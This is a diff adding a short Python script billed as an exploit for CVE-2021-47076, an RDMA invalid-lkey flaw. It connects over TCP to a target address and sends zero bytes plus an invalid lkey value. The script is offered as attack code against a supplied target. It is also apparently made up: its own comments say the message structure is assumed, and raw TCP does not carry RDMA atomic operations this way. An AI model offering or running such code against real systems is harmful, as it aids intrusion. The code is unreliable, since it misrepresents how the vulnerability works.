@@ -1,0 +1,24 @@
+```python
+import socket
+import struct
+
+# Example payload to exploit CVE-2021-47076
+def exploit_invalid_lkey(target_ip, target_port):
+    # Create a socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((target_ip, target_port))
+
+    # Construct an RDMA message with an invalid lkey
+    # Assuming the payload structure requires an invalid lkey value
+    invalid_lkey = struct.pack('!I', 0xFFFFFFFF)  # Example of an invalid lkey
+    atomic_operation_message = b'\x00' * 32 + invalid_lkey  # Construct the message
+
+    # Send the payload
+    sock.send(atomic_operation_message)
+
+    # Close the socket
+    sock.close()
+
+# Usage
+# exploit_invalid_lkey('192.168.1.100', 12345)  # Replace with the target IP and port
+```
